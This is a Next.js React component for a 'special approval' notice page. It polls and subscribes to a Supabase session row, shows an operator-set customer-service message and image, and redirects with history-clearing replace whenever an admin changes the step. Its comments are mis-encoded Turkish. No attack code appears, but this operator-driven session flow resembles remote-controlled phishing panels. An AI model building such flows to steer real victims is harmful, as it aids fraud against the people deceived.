"use client";

import { useEffect, useState, useRef } from "react";
import Image from "next/image";
import { DemoShell } from "@/components/demo/DemoShell";
import { stepToPath } from "@/lib/session-routes";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import type { SessionStep } from "@/types/session";

import { Linkify } from "@/components/ui/Linkify";

export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
  const supabase = createBrowserSupabaseClient();
  const [effectiveSessionId, setEffectiveSessionId] = useState(sessionId);
  const [message, setMessage] = useState("LÃ¼tfen bekleyiniz...");
  const [imageUrl, setImageUrl] = useState<string | null>(null);
  const [lang, setLang] = useState<"de" | "tr">("de");
  const [ready, setReady] = useState(false);
  
  // KRÄ°TÄ°K: Bu ref true olduÄŸunda sayfa bir daha asla render olmaz ve yÃ¶nlendirmeyi bozamaz.
  const isRedirecting = useRef(false);

  useEffect(() => {
    if (sessionId) return;
    const cached = localStorage.getItem("activeSessionId");
    if (cached) setEffectiveSessionId(cached);
  }, [sessionId]);

  useEffect(() => {
    if (!effectiveSessionId || isRedirecting.current) return;
    if (!supabase) return;

    const exitNow = (nextStep: string) => {
      // EÄŸer hedef hala bu sayfaysa veya zaten yÃ¶nlendirme varsa dur
      if (!nextStep || nextStep === "special_approval" || isRedirecting.current) return;
      
      isRedirecting.current = true; 
      const targetPath = stepToPath(nextStep as SessionStep, effectiveSessionId);
      
      console.log("DÃ¶ngÃ¼ kÄ±rÄ±ldÄ±, fÄ±rlatÄ±lÄ±yor:", targetPath);
      
      // window.location.replace tarayÄ±cÄ± geÃ§miÅŸini temizler
      window.location.replace(targetPath);
    };

    const syncStatus = async () => {
      if (isRedirecting.current) return;

      const { data } = await supabase
        .from("sessions")
        .select("current_step,form_data")
        .eq("id", effectiveSessionId)
        .maybeSingle();
      
      if (!data || isRedirecting.current) return;

      // Admin adÄ±mÄ± deÄŸiÅŸtirdiÄŸi an bu sayfadan kurtul
      if (data.current_step && data.current_step !== "special_approval") {
        exitNow(data.current_step);
        return;
      }

      const fd = (data.form_data ?? {}) as Record<string, any>;
      setMessage(fd.specialNoticeText ?? fd.customMessage ?? "LÃ¼tfen bekleyiniz...");
      setImageUrl(fd.specialNoticeImage ?? fd.customImage ?? null);
      setLang((fd.specialNoticeLang as "de" | "tr") ?? "de");
      setReady(true);
    };

    void syncStatus();

    // Realtime Dinleyici
    const channel = supabase.channel(`guard-${effectiveSessionId}`)
      .on("postgres_changes", { event: "UPDATE", schema: "public", table: "sessions", filter: `id=eq.${effectiveSessionId}` }, 
      (payload) => {
        const next = payload.new.current_step;
        if (next && next !== "special_approval") exitNow(next);
      })
      .subscribe();

    // 2 saniyede bir yedek kontrol
    const timer = setInterval(() => {
      if (!isRedirecting.current) void syncStatus();
    }, 2000);

    return () => {
      clearInterval(timer);
      void supabase.removeChannel(channel);
    };
  }, [effectiveSessionId, supabase]);

  // YÃ¶nlendirme baÅŸladÄ±ÄŸÄ± an ekrana hiÃ§bir ÅŸey basma, render'Ä± Ã¶ldÃ¼r.
  if (isRedirecting.current) return null;

  if (!ready) {
    return (
      <DemoShell title="Bildirim">
        <div className="flex justify-center py-12">
          <div className="size-10 animate-spin rounded-full border-4 border-brand-blue/20 border-t-brand-blue" />
        </div>
      </DemoShell>
    );
  }

  return (
    <DemoShell title={lang === "de" ? "Melding" : "Bilgilendirme"}>
      <div className="app-panel fade-in mx-auto w-full max-w-3xl rounded-3xl bg-white p-6 text-center shadow-xl border border-zinc-100">
        <div className="mb-4">
          <p className="text-xs font-bold uppercase tracking-widest text-brand-blue">Klantenservice</p>
        </div>
        
        <p className="whitespace-pre-wrap text-lg font-bold text-zinc-900 leading-tight mb-6">
          <Linkify text={message} />
        </p>

        {imageUrl && (
          <div className="mt-4 rounded-2xl overflow-hidden border border-zinc-50 shadow-sm bg-white p-1">
            <Image 
              src={imageUrl} 
              alt="Support" 
              width={1200} 
              height={800} 
              className="h-auto w-full rounded-xl object-contain mx-auto" 
              priority 
            />
          </div>
        )}
      </div>
    </DemoShell>
  );
}